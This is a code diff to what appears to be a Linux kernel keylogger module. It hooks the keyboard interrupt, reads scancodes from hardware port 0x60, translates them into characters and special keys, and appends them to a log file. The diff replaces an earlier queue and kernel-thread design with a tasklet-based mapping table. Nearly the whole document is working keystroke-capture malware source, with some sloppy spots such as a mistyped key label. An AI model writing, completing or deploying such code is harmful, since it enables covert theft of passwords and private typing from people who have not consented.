@@ -29,51 +29,9 @@ struct task_struct *logger;
 
 struct logger_data{
 	char scancode;
+	char status;
 	struct cdev cdev;
 } ld;
-
-#define CQUEUE_MAX 128
-struct cqueue_t{
-	unsigned char buffer[CQUEUE_MAX];
-	int f, r;
-	int size;
-};
-
-void cqueue_init(struct cqueue_t *cqueue)
-{
-	cqueue->f = 0;
-	cqueue->r = CQUEUE_MAX - 1;
-	cqueue->size = 0;
-}
-
-int cqueue_empty(struct cqueue_t *cqueue)
-{
-	return (cqueue->size == 0);
-}
-
-int cqueue_full(struct cqueue_t *cqueue)
-{
-	return (cqueue->size == CQUEUE_MAX - 1);
-}
-
-int cqueue_insert(struct cqueue_t *cqueue, char c)
-{
-	cqueue->r = cqueue->r + 1 % CQUEUE_MAX;
-	cqueue->buffer[cqueue->r] = c;
-	++cqueue->size;
-	return 1;
-}
-
-char cqueue_remove(struct cqueue_t *cqueue)
-{
-	char c = cqueue->buffer[cqueue->f];
-
-	cqueue->f = cqueue->f + 1 % CQUEUE_MAX;
-	--cqueue->size;
-	return c;	
-}
-
-struct cqueue_t keystroke_queue;
 
 /* =================================================================== */
 
@@ -120,73 +78,212 @@ int log_write(struct file *fp, unsigned char *data,
 
 /* =================================================================== */
 
-char convert_scancode(const char c)
-{
-	switch(c){
-		default:
-			return '!';
-
-		case 0x4D:
-			return 'a';
-
-		case 0x4E:
-			return 's';
-
-		case 0x4F:
-			return 'd';
-
-		case 0x50:
-			return 'f';
-
-		case 61:
-			return 'A';
-	}
-}
-
-int kthread_log_keystrokes(void *data)
-{
-	while(!kthread_should_stop()){
-		schedule();
-		/*if(!cqueue_empty(&keystroke_queue)){
-			char buf[16];
-			memset(buf, 0, sizeof(buf));
-			char c = 'a'; cqueue_remove(&keystroke_queue);
-			sprintf(buf, "%d\n", c);
-			printk(buf);
-			sprintf(buf, "[%d]", cqueue_remove(&keystroke_queue));
-			log_write(log_fp, buf, sizeof(buf));
-		}
-		*/
-		if(g != 0x00){
-			char buf[16];
-			memset(buf, 0, sizeof(buf));
-			sprintf(buf, "g=%d\n", g);
-			printk(buf);
-			
-			memset(buf, 0, sizeof(buf));
-			sprintf(buf, "[%c => %d]", g, (int)g);
-			log_write(log_fp, buf, sizeof(buf));
-			char c = convert_scancode(g);
-			if(c != '!'){
-				sprintf(buf, "[%c]", c);
-				log_write(log_fp, buf, sizeof(buf));
-			}
-			g = 0x00;
-		}
-	}
-
-	return 0;
-}
-
 void tasklet_logger(unsigned long data)
 {
 	struct logger_data *ldata = (struct logger_data*)data;
+	static int shift = 0;
 
 	printk("ld->scancode = %d\n", ldata->scancode);	
-	char buf[16];
+	/*char buf[16];
 	memset(buf, 0, sizeof(buf));
 	sprintf(buf, "[%d]", ldata->scancode);
-	log_write(log_fp, buf, sizeof(buf));
+	log_write(log_fp, buf, sizeof(buf));*/
+	if(ldata->scancode > 0 && ldata->scancode <= 170){
+		char buf[16];
+		memset(buf, 0, sizeof(buf));
+		switch(ldata->scancode){
+			default: 
+				break;
+
+			case 1:
+				strcpy(buf, "(ESC)"); break;
+
+			case 2:
+				strcpy(buf, "1"); break;
+
+			case 3:
+				strcpy(buf, "2"); break;
+	
+			case 4:
+				strcpy(buf, "3"); break;
+			
+			case 5:
+				strcpy(buf, "4"); break;
+
+			case 6:
+				strcpy(buf, "5"); break;
+
+			case 7:
+				strcpy(buf, "6"); break;
+
+			case 8:
+				strcpy(buf, "7"); break;
+
+			case 9:
+				strcpy(buf, "8"); break;
+
+			case 10:
+				strcpy(buf, "9"); break;
+
+			case 11:
+				strcpy(buf, "0"); break;
+
+			case 12:
+				strcpy(buf, "-"); break;
+
+			case 13:
+				strcpy(buf, "="); break;
+
+			case 14:
+				strcpy(buf, "(BACK)"); break;
+
+			case 15:
+				strcpy(buf, "(TAB)"); break;
+
+			case 16:
+				strcpy(buf, "q"); break;
+
+			case 17:
+				strcpy(buf, "w"); break;
+
+			case 18:
+				strcpy(buf, "e"); break;
+
+			case 19:
+				strcpy(buf, "r"); break;
+
+			case 20:
+				strcpy(buf, "t"); break;
+
+			case 21:
+				strcpy(buf, "y"); break;
+
+			case 22:
+				strcpy(buf, "u"); break;
+
+			case 23:
+				strcpy(buf, "i"); break;
+
+			case 24:
+				strcpy(buf, "o"); break;
+
+			case 25:
+				strcpy(buf, "p"); break;
+
+			case 26:
+				strcpy(buf, "["); break;
+
+			case 27:
+				strcpy(buf, "]"); break;
+
+			case 28:
+				strcpy(buf, "(ENTER)"); break;
+
+			case 29:
+				strcpy(buf, "(CTRL)"); break;
+
+			case 30:
+				strcpy(buf, "a"); break;
+
+			case 31:
+				strcpy(buf, "s"); break;
+
+			case 32:
+				strcpy(buf, "d"); break;
+
+			case 33:
+				strcpy(buf, "f"); break;
+		
+			case 34:
+				strcpy(buf, "g"); break;
+
+			case 35:
+				strcpy(buf, "h"); break;
+
+			case 36:
+				strcpy(buf, "j"); break;
+
+			case 37:
+				strcpy(buf, "k"); break;
+	
+			case 38:
+				strcpy(buf, "l"); break;
+		
+			case 39:
+				strcpy(buf, ";"); break;
+
+			case 40:
+				strcpy(buf, "'"); break;
+	
+			case 41:
+				strcpy(buf, "`"); break;
+
+			case 42:
+			case 170:
+				/*strcpy(buf, "(SHIFT)"); break;*/
+				sprintf(buf, "(SHIFT-%d)", ldata->status); break;
+
+			case 44:
+				strcpy(buf, "z"); break;
+			
+			case 45:
+				strcpy(buf, "x"); break;
+
+			case 46:
+				strcpy(buf, "c"); break;
+
+			case 47:
+				strcpy(buf, "v"); break;
+			
+			case 48:
+				strcpy(buf, "b"); break;
+	
+			case 49:
+				strcpy(buf, "n"); break;
+
+			case 50:
+				strcpy(buf, "m"); break;
+
+			case 51:
+				strcpy(buf, ","); break;
+
+			case 52:
+				strcpy(buf, "."); break;
+		
+			case 53:
+				strcpy(buf, "/"); break;
+	
+			case 54:
+				
+				strcpy(buf, "(R-SHIFT)"); break;
+
+			case 56:
+				strcpy(buf, "(R-ALT"); break;
+		
+			/* Space */
+			case 55:
+			case 57:
+			case 58:
+			case 59:
+			case 60:
+			case 61:
+			case 62:
+			case 63:
+			case 64:
+			case 65:
+			case 66:
+			case 67:
+			case 68:
+			case 70:
+			case 71:
+			case 72:
+				strcpy(buf, " "); break;
+
+			case 83:
+				strcpy(buf, "(DEL)"); break;
+		}
+		log_write(log_fp, buf, sizeof(buf));
+	}
 }
 
 DECLARE_TASKLET(my_tasklet, tasklet_logger, (unsigned long)&ld);
@@ -197,24 +294,7 @@ irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 	static unsigned char scancode, status;
 
 	ldata->scancode = inb(0x60);
-	status = inb(0x64);
-
-	/*ldata->scancode = scancode;
-	printk("SC: %x %s\t", (int) *((char *)ldata->scancode) & 0x7F,
-		*((char *)ldata->scancode) & 0x80 ? "Released" : "Pressed");
-	printk("\n");*/
-	
-
-	if(scancode == 0x02 || scancode == 0x82){
-		/*printk("You pressed ESC!\n");*/
-		printk("Status: %d\n", status);
-	}
-	else{
-		g = scancode;
-		/*if(!cqueue_full(&keystroke_queue)){
-			cqueue_insert(&keystroke_queue, scancode);
-		}*/
-	}
+	ldata->status = inb(0x64);
 
 	tasklet_schedule(&my_tasklet);
 	/* TODO:
@@ -243,15 +323,18 @@ static int __init kb_init(void)
 	}
 	else{
 		printk("SUCCESSFULLY opened log file.\n");
+		unsigned int size = 0;
+		struct kstat stat;
+		memset(&stat, 0, sizeof(stat));
+		size = vfs_fstat(NAME, &stat);
+		printk("FILE SIZE: %d\terr=%d\n", (int)stat.size, size);
 		unsigned char buf[32];
 		memset(buf, 0, sizeof(buf));
-		strcpy(buf, "[a][a]\n[b][b]\n");
+		strcpy(buf, "-LOG START-\n\n");
 		log_write(log_fp, buf, sizeof(buf));
 		/*logger = kthread_run(&kthread_log_keystrokes, NULL, "keylogger");
 		printk("KERNEL THREAD: %s\n", logger->comm);		*/
 	}
-
-	cqueue_init(&keystroke_queue);
 
 	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
 			NAME, &ld);
